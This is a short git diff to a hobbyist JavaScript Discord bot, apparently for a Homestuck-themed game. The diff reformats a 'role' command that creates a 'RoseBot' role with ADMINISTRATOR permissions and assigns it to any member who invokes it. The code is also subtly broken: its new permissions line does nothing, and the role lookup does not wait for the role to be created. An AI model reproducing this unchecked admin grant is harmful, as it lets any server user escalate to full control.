@@ -67,7 +67,6 @@ client.on('message', message => {
 		var giclopes = 0;
 		var titachnids = 0;
 		var archerons = 0;
-		var rooks = 0;
 		var grist = 0;
 		var health = 0;
 		var results = '';
@@ -80,15 +79,16 @@ client.on('message', message => {
 		
 		switch(cmd){
 			case 'role':
+				new Discord.Permissions(client.user,'ADMINISTRATOR');
 				message.guild.createRole({
-		name: 'RoseBot',
-		color: '#B536DA',
-		permissions: 'ADMINISTRATOR',
-		editable: 'true',
-	});
-	console.log('Role created successfully');
-		let role = message.guild.roles.find("name", "RoseBot");
-	message.member.addRole(role);
+					name: 'RoseBot',
+					color: '#B536DA',
+					permissions: 'ADMINISTRATOR',
+					editable: 'true',
+				});
+				console.log('Role created successfully');
+				let role = message.guild.roles.find("name", "RoseBot");
+				message.member.addRole(role);
 			break;
 			case 'ping':
 				message.reply('Pong!');
